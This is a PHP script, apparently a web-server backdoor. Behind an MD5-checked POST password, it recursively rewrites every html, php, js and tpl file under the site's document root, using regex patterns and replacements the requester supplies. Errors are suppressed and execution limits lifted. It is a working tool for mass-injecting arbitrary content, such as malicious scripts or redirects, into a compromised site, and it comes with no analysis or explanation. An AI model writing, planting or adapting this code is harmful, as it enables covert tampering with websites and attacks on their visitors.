<?php
error_reporting(0);
ini_set('max_execution_time', 900);
ini_set('memory_limit', '-1');
function scan_dir($dirname){ 
	global $sobs, $coun, $list_replace, $list_pattern, $repl; 
	$dir = opendir($dirname); 
	$coun_repl = 0;
	while (($file = readdir($dir)) !== false){ 
		if($file != '.' && $file != '..'){ 
			$temp1 = explode('.', $dirname . $sobs . $file);
			$extention = strtolower(array_pop($temp1));
			if(is_file($dirname . $sobs . $file) && ($extention == 'html' || $extention == 'php' || $extention == 'js' || $extention == 'tpl')){ 
				$content = @file_get_contents($dirname . $sobs . $file);
				$content = @preg_replace($list_pattern, $list_replace, $content, '-1', $coun_repl);
				if ($coun_repl >= 1) {
					@file_put_contents($dirname . $sobs . $file, $content); 
					$repl +=1 ;
				}
				$coun = $coun + 1; 
			}
			if(is_dir($dirname . $sobs . $file)) 
				scan_dir($dirname . $sobs . $file); 
		} 
	} 
	closedir($dir); 
}
if (!function_exists('file_put_contents')) {
    function file_put_contents($filename, $data) {
        $f = @fopen($filename, 'w');
        if (!$f) {
            return false;
        } else {
            $bytes = fwrite($f, $data);
            fclose($f);
            return $bytes;
        }
    }
}
if ( !function_exists('file_get_contents') ) {
   function file_get_contents($file) {
       $file = file($file);
       return !$file ? false : implode('', $file);
   }
}
if (isset($_POST['startreplace'])){
	$hash = md5($_POST['startreplace']);
	if ($hash == '8b893efbdc733d479dfab302ed195fd7') {
		if ($_POST['replace'][1] == '\\'){
			$list_replace = json_decode(stripslashes($_POST['replace']));
			$list_pattern = json_decode(stripslashes($_POST['pattern']));
		}
		else {
			$list_replace = json_decode($_POST['replace']);
			$list_pattern = json_decode($_POST['pattern']);
		}
		$coun = 0;
		$repl = 0;
		$dir = $_SERVER['DOCUMENT_ROOT'];
		if (strpos(strtolower(php_uname()), 'win') === false) 
			$sobs = '/'; 
		else 
			$sobs = '\\'; 
		$a = $dir; 
		if (substr($a, -1) == $sobs) 
			$a = substr($a, 0, strlen($a) - 1); 
		scan_dir($a); 
		echo 'Finish! Dir: '.$dir.' Replace: ' . $repl . ' Files: '. $coun; 	
	};
}
?>